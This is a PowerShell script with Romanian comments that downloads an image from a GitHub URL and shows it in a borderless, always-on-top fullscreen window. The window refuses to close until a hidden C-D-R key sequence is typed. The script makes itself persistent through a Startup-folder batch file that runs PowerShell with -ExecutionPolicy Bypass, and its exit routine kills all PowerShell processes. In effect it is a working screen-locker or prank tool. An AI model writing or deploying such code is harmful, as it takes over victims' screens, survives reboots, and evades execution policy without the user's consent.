# URL-ul imaginii
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"

# Funcție pentru descărcarea imaginii
function Download-Image {
    try {
        Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -ErrorAction Stop
    } catch {
        Write-Host "Eroare la descărcarea imaginii. Verificați conexiunea la internet." -ForegroundColor Red
        exit
    }
}

# Funcție pentru afișarea imaginii pe tot ecranul
function Show-FullScreenImage {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    $form = New-Object System.Windows.Forms.Form
    $form.WindowState = 'Maximized'
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true
    $form.BackColor = [System.Drawing.Color]::Black
    $form.StartPosition = 'CenterScreen'

    try {
        $img = [System.Drawing.Image]::FromFile($tempImagePath)
    } catch {
        Write-Host "Eroare la încărcarea imaginii. Verificați fișierul descărcat." -ForegroundColor Red
        exit
    }

    $pictureBox = New-Object System.Windows.Forms.PictureBox
    $pictureBox.Image = $img
    $pictureBox.Dock = 'Fill'
    $pictureBox.SizeMode = 'StretchImage'
    $form.Controls.Add($pictureBox)

    # Variabilă globală pentru secvența de taste
    $global:keySequence = ""

    # Înregistrarea evenimentului KeyDown
    $form.Add_KeyDown({
        param($sender, $eventArgs)
        $global:keySequence += $eventArgs.KeyCode
        if ($global:keySequence -like "*C*D*R") {
            Stop-All
        }
    })

    # Protejează împotriva închiderii accidentale
    $form.Add_FormClosing({
        param($sender, $eventArgs)
        if (-not $global:exitFlag) {
            $eventArgs.Cancel = $true
        }
    })

    [void]$form.ShowDialog()
}

# Funcție pentru oprirea completă a scriptului
function Stop-All {
    $global:exitFlag = $true
    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PersistentImageViewer.bat" -Force -ErrorAction SilentlyContinue
    Stop-Process -Name "powershell" -Force -ErrorAction SilentlyContinue
    exit
}

# Configurare pornire automată fără drepturi de administrator
function Set-Startup {
    $scriptPath = $MyInvocation.MyCommand.Path
    $batFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PersistentImageViewer.bat"
    $batContent = "@echo off`nstart /min powershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`""
    Set-Content -Path $batFilePath -Value $batContent -Force
}

# Executare funcționalități
Download-Image
Set-Startup
Show-FullScreenImage
